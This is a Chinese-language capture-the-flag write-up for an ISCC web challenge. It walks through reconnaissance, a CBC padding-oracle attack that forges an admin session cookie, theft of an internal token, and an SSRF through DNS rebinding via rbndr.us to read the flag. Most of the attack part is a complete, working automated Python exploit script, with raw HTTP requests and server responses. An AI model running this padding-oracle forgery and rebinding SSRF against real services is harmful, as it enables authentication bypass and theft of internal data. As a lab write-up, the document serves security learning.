
## 一、信息收集

浏览目标站点的默认首页，我们会捕捉到一些显眼的端点信息：

```html
<p>API surfaces: <code>/graphql</code>, <code>/login</code>, <code>/api/profile</code></p>
<!-- TODO: review filter parsing before public release -->
```

进一步查阅 `robots.txt` 文件的内容：

```text
User-agent: *
Disallow: /api/session/
Disallow: /api/users/
Disallow: /api/webhook/
Disallow: /graphql
# graphql introspection disabled per security review (PROD-2024-Q3)
```

综合上述线索，我们可以梳理出以下几个高价值的 API 路径：

- `/graphql`
- `/api/session/`
- `/api/users/`
- `/api/webhook/`
- `/api/profile`

但真正能够串联起整个攻击流程的，实际上只有 `/api/session/decrypt`、`/api/profile` 以及 `/api/webhook/test` 这三个核心接口。

## 二、确认 Padding Oracle

### 1. 观察 `/api/session/decrypt`

尝试向此路由提交任意编造的 token 数据，可以观察到服务器给出的 HTTP 状态码具有差异性。

比方说，当我们提交一个格式完全错误的 token 时：

```http
POST /api/session/decrypt HTTP/1.1
Host: 39.105.213.28:12605
Content-Type: application/json

{"token":"AA"}
```

响应如下：

```http
HTTP/1.1 400 BAD REQUEST

{"error":"padding"}
```

该现象表明，后端逻辑是在执行完 CBC 解密操作后，再去校验 PKCS#7 填充格式的合法性。

### 2. 为什么这就是 Oracle

一旦某个服务端接口能够将“填充合法”与“填充无效”的情形通过不同的响应反馈给客户端，那么这就构成了一个典型的 Padding Oracle 漏洞场景。

需要特别注意的是，针对本题，我们判断填充是否成功的依据并非是“状态码为 200”，具体规则如下：

- `400 {"error":"padding"}`：代表填充格式遭到破坏。
- `422 {"error":"decode"}` 或是其它不等于 `400` 的状态码：意味着填充格式校验通过，仅仅是解密后的明文数据无法按照预期格式（如 JSON）进行解析。

这是一个极易被忽视的细节。  
在动手测试阶段，当我们对特定的密文块末尾字节进行盲猜时，在 256 种可能性中，仅会命中唯一一次非 `400`（通常为 `422`）的响应。这个独特的反馈便是指引我们实施 Oracle 攻击的“明灯”。

## 三、利用原理

### 1. CBC 解密公式

假设我们将密文序列划分为如下的若干区块：

```text
C0 | C1 | C2 | ... | Cn
```

根据 CBC 模式的特性，第 `i` 块的明文还原过程遵循以下等式：

```text
Pi = D(Ci) xor C(i-1)
```

倘若我们借助 Padding Oracle 手段，推算出了目标区块在底层运算过程中的中间态数值：

```text
Ii = D(Ci)
```

我们便能够顺势推导出应当如何伪造它的前置区块：

```text
C(i-1) = Ii xor Pi
```

这也就意味着，只要获取了特定密文块对应的中间状态，我们就拥有了掌控解密结果的权力，使其变成我们期望的任意明文片段。

### 2. 这题的构造方式

本题中，我们需要伪造出来的会话内容为：

```json
{"user":"oracle","role":"admin"}
```

我们需要对这串数据实施 PKCS#7 规范的填充，并以 16 个字节为单位将其切割成不同的块。

随后，我们将执行标准的“由尾至头反向推演”策略：

1. 任意构造末尾的密文分块 `Cn`。
2. 依靠 Oracle 机制测算出对应的中间值 `In = D(Cn)`。
3. 计算出倒数第二个密文块的值：`C(n-1) = In xor Pn`。
4. 将刚刚算出的 `C(n-1)` 视作新的分析对象，继续测算其对应的中间值 `I(n-1)`。
5. 进一步推算更前一个密文块：`C(n-2) = I(n-1) xor P(n-1)`。
6. 循环执行此逻辑，直至首个分组。

将这些计算得出的密文块按顺序拼接在一起，即可收获一枚能够被服务端完美识别并解析为我们预设 JSON 数据的 `session` 凭证。

## 四、伪造管理员会话

在利用代码中，承担主要工作的是以下两个函数：

- `oracle()`：负责向 `/api/session/decrypt` 发起请求，通过识别响应是否为 `400` 错误来鉴别 padding 的正确性。
- `recover_intermediate()`：以字节为单位，逐步推导并还原目标密文块的中间值 `D(Ci)`。

核心的代码逻辑片段展示如下：

```python
for pad in range(1, 17):
    idx = 16 - pad
    for guess in range(256):
        for j in range(idx + 1, 16):
            forged[j] = dec[j] ^ pad
        forged[idx] = guess
        if not self.oracle(bytes(forged) + target_block):
            continue
        dec[idx] = guess ^ pad
        break
```

这段逻辑的运作思路十分清晰：

1. 优先对区块最末端的字节进行穷举测试。
2. 若某次枚举恰好使得服务端的 padding 校验通过，便成功解出了当前目标字节背后的中间态数据。
3. 按照此步骤循环 16 轮，即可完全掌握整个数据块的中间值。

紧接着配合如下代码：

```python
cipher_blocks[idx] = xor_bytes(dec, blocks[idx])
```

便可顺利根据我们所期望的明文数据，逆向演算出前序密文块应有的值。

## 五、拿到管理员内部资料

在成功制作出合法的 `session` 之后，我们就可以直接向用户信息接口发起请求：

```http
GET /api/profile HTTP/1.1
Host: 39.105.213.28:12605
Cookie: session=<forged_admin_session>
```

在我的实际测试中，服务端回显了如下结果：

```json
{
  "email": "oracle@oracle.local",
  "internal_endpoint": "http://internal-api:6000/cache/template",
  "internal_token": "0ce471fa7d5f430dcfd6318ce20e3558",
  "role": "admin",
  "session_clue": "Sessions are AES-CBC with a server-fixed IV.",
  "uid": "oracle"
}
```

上述返回结果中，最具价值的字段莫过于：

- `internal_token`
- `internal_endpoint`

获取到这些数据，意味着触发最终 SSRF 漏洞的必要条件已经全部具备。

## 六、SSRF + DNS Rebinding 读取 Flag

作为终极一击，我们调用以下接口：

```http
POST /api/webhook/test HTTP/1.1
Host: 39.105.213.28:12605
Content-Type: application/json
Cookie: session=<forged_admin_session>

{
  "url": "http://7f000001.01010101.rbndr.us:6000/cache/template?name=/flag",
  "method": "GET",
  "headers": {
    "X-Internal-Token": "<internal_token>"
  }
}
```

此处的攻击技巧在于：

- 表面上，我们指示服务器去抓取 `rbndr.us` 这个外部域名的内容。
- 但实质上，我们利用了 DNS 重新绑定（DNS Rebinding）机制，促使目标机器在真正发起连接时将其解析到本地回环地址 `127.0.0.1`。
- 借此手法，我们得以突破网络隔离，访问到其内部的服务端口及路径 `:6000/cache/template?name=/flag`。

考虑到 DNS Rebinding 具有一定的概率性，并非每次都能一次性命中，因此自动化程序中通常会包含循环探测机制。

在我的实弹演练过程中，前两轮请求均遭到了 `403` 拒绝，直至第三轮才成功欺骗解析，得到了如下反馈：

```json
{"content": "ISCC{PnHCWSSKcJBm5M6ssZXV}", "name": "/flag"}
```

至此，我们成功截获了 flag：

```text
ISCC{PnHCWSSKcJBm5M6ssZXV}
```

## 七、完整利用脚本

一键通关代码的路径如下：

- [solve_oracle_whisper.py](/E:/CTFstudy/这是ISCC区域赛/WEB/oracle_whisper/solve_oracle_whisper.py)

执行命令参考：

```powershell
& 'C:\Users\ROG\.cache\codex-runtimes\codex-primary-runtime\dependencies\python\python.exe' .\WEB\oracle_whisper\solve_oracle_whisper.py
```

该工具将被设计为无人值守模式，依次执行下述操作：

1. 触发 Padding Oracle 漏洞以推算加密中间态。
2. 生成具有超级权限的虚假 `session`。
3. 访问 `/api/profile` 端点以窃取 `internal_token` 数据。
4. 持续不断地向 `/api/webhook/test` 发起请求进行盲打。
5. 在 DNS 重新绑定生效的瞬间，抓取包含 `ISCC{...}` 格式的最终答案。
6. 把获取到的答案妥善存入 `artifacts/flag.txt` 文件中。

## 八、完整脚本正文

```python
#!/usr/bin/env python3
"""Oracle's Whisper solve script.

利用链：
1. /api/session/decrypt 存在 CBC Padding Oracle。
2. 通过倒推中间值伪造 admin session。
3. 使用 admin session 访问 /api/profile 获取 internal_token。
4. 借助 /api/webhook/test + DNS rebinding 访问内网 /flag。
"""
import argparse
import base64
import json
import os
import re
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path


BLOCK = 16
DEFAULT_BASE = "http://39.105.213.28:12605"
DEFAULT_WEBHOOK_URL = "http://7f000001.01010101.rbndr.us:6000/cache/template?name=/flag"
FLAG_RE = re.compile(r"ISCC\{[^}\r\n]{1,256}\}")


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def xor_bytes(left: bytes, right: bytes) -> bytes:
    return bytes(a ^ b for a, b in zip(left, right))


class Client:
    def __init__(self, base: str, timeout: int = 10, retries: int = 3, retry_sleep: float = 0.8) -> None:
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.retries = retries
        self.retry_sleep = retry_sleep

    def request(self, method: str, path: str, *, body: bytes | None = None, headers: dict | None = None) -> tuple[int, dict, bytes]:
        req = urllib.request.Request(
            self.base + path,
            data=body,
            method=method,
            headers=headers or {},
        )
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                return resp.getcode(), dict(resp.info().items()), resp.read()
        except urllib.error.HTTPError as exc:
            return exc.code, dict(exc.headers.items()), exc.read()

    def post_json(self, path: str, payload: dict, extra_headers: dict | None = None) -> tuple[int, dict, bytes]:
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "oracle-whisper-solve/1.0",
            "Connection": "close",
        }
        if extra_headers:
            headers.update(extra_headers)
        return self.request("POST", path, body=json.dumps(payload, ensure_ascii=False).encode(), headers=headers)

    def get(self, path: str, cookie: str | None = None) -> tuple[int, dict, bytes]:
        headers = {
            "User-Agent": "oracle-whisper-solve/1.0",
            "Connection": "close",
        }
        if cookie:
            headers["Cookie"] = cookie
        return self.request("GET", path, headers=headers)

    def oracle(self, blob: bytes) -> bool:
        # 该接口的关键差异是：
        # 400 -> padding 错误
        # 422/200/... -> padding 正确，只是明文未必能被成功解码
        token = b64url_encode(blob)
        payload = {"token": token}
        for attempt in range(self.retries):
            code, _, _ = self.post_json("/api/session/decrypt", payload)
            if code == 429:
                time.sleep(self.retry_sleep * (attempt + 1))
                continue
            return code != 400
        raise RuntimeError("oracle hit rate limiting too many times")

    def recover_intermediate(self, target_block: bytes) -> bytes:
        if len(target_block) != BLOCK:
            raise ValueError("target block must be 16 bytes")

        # dec[i] = D_k(target_block)[i]
        dec = bytearray(BLOCK)
        forged = bytearray(BLOCK)
        for pad in range(1, BLOCK + 1):
            idx = BLOCK - pad
            for guess in range(256):
                for j in range(idx + 1, BLOCK):
                    forged[j] = dec[j] ^ pad
                forged[idx] = guess
                if not self.oracle(bytes(forged) + target_block):
                    continue
                dec[idx] = guess ^ pad
                break
            else:
                raise RuntimeError(f"failed to recover byte at pad={pad}")
            print(f"[oracle] recovered {pad:02d}/16 bytes for current block", flush=True)
        return bytes(dec)

    def forge_session(self, plaintext: bytes) -> str:
        if len(plaintext) % BLOCK != 0:
            raise ValueError("plaintext must be padded to a multiple of 16 bytes")

        blocks = [plaintext[i : i + BLOCK] for i in range(0, len(plaintext), BLOCK)]
        cipher_blocks = [b""] * (len(blocks) + 1)
        cipher_blocks[-1] = os.urandom(BLOCK)

        # 从最后一个密文块开始逆推：
        # 如果知道 I_i = D_k(C_i)，则只需设置 C_{i-1} = I_i xor P_i
        for idx in range(len(blocks) - 1, -1, -1):
            dec = self.recover_intermediate(cipher_blocks[idx + 1])
            cipher_blocks[idx] = xor_bytes(dec, blocks[idx])

        token = b"".join(cipher_blocks)
        return b64url_encode(token)

    def fetch_profile(self, token: str) -> dict:
        code, _, raw = self.get("/api/profile", cookie=f"session={token}")
        if code != 200:
            raise RuntimeError(f"/api/profile returned {code}: {raw.decode('utf-8', 'replace')}")
        return json.loads(raw.decode("utf-8", "replace"))

    def trigger_webhook(self, token: str, internal_token: str, url: str) -> tuple[int, dict, bytes]:
        payload = {
            "url": url,
            "method": "GET",
            "headers": {"X-Internal-Token": internal_token},
        }
        return self.post_json("/api/webhook/test", payload, extra_headers={"Cookie": f"session={token}"})


def pkcs7_pad(data: bytes, block_size: int = BLOCK) -> bytes:
    pad_len = block_size - (len(data) % block_size)
    if pad_len == 0:
        pad_len = block_size
    return data + bytes([pad_len]) * pad_len


def parse_webhook_response(raw: bytes) -> str:
    text = raw.decode("utf-8", "replace")
    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        return text
    body = data.get("body", "")
    if isinstance(body, dict):
        return json.dumps(body, ensure_ascii=False)
    if isinstance(body, str):
        try:
            nested = json.loads(body)
        except json.JSONDecodeError:
            return body
        if isinstance(nested, dict):
            return json.dumps(nested, ensure_ascii=False)
        return body
    return text


def extract_flag(text: str) -> str | None:
    match = FLAG_RE.search(text)
    if match:
        return match.group(0)
    return None


def main() -> int:
    parser = argparse.ArgumentParser(description="Reproduce Oracle's Whisper with a CBC padding oracle")
    parser.add_argument("--base", default=DEFAULT_BASE, help="challenge base URL")
    parser.add_argument("--webhook-url", default=DEFAULT_WEBHOOK_URL, help="internal webhook URL used for flag extraction")
    parser.add_argument("--timeout", type=int, default=10, help="HTTP timeout in seconds")
    parser.add_argument("--retries", type=int, default=3, help="oracle retry count on 429")
    parser.add_argument("--retry-sleep", type=float, default=0.8, help="sleep between oracle retries")
    parser.add_argument("--artifacts-dir", default=str(Path(__file__).resolve().parent / "artifacts"), help="output directory")
    parser.add_argument("--attempts", type=int, default=24, help="webhook retries")
    args = parser.parse_args()

    artifacts_dir = Path(args.artifacts_dir)
    artifacts_dir.mkdir(parents=True, exist_ok=True)

    client = Client(args.base, timeout=args.timeout, retries=args.retries, retry_sleep=args.retry_sleep)

    # 题目实际接受的会话 JSON 为：
    # {"user":"oracle","role":"admin"}
    plaintext = pkcs7_pad(b'{"user":"oracle","role":"admin"}')
    print("[+] forging admin session", flush=True)
    token = client.forge_session(plaintext)
    (artifacts_dir / "admin_token.txt").write_text(token + "\n", encoding="utf-8")

    profile = client.fetch_profile(token)
    (artifacts_dir / "profile.json").write_text(json.dumps(profile, ensure_ascii=False, indent=2), encoding="utf-8")

    internal_token = profile.get("internal_token")
    if not internal_token:
        raise RuntimeError("internal_token missing from /api/profile")

    print(f"[+] admin token: {token}")
    print(f"[+] internal token: {internal_token}")

    for attempt in range(1, args.attempts + 1):
        code, _, raw = client.trigger_webhook(token, internal_token, args.webhook_url)
        text = parse_webhook_response(raw)
        (artifacts_dir / f"webhook_attempt_{attempt}.txt").write_text(text, encoding="utf-8")
        flag = extract_flag(text)
        if code == 200 and flag:
            (artifacts_dir / "flag.txt").write_text(flag + "\n", encoding="utf-8")
            print(flag)
            return 0
        print(f"[-] attempt {attempt}: status={code}")
        time.sleep(1)

    print("[-] flag not found; try running again", file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
```

## 九、脚本输出文件

当上述程序执行完毕后，您可以在 `artifacts` 文件夹内找到以下产物：

- `admin_token.txt`：通过算法伪造出来的特权 session 字符串。
- `profile.json`：包含内网请求凭据（`internal_token`）的用户档案信息。
- `webhook_attempt_*.txt`：历次探测 webhook 接口时服务端响应的完整记录。
- `flag.txt`：我们所追求的最终目标答案。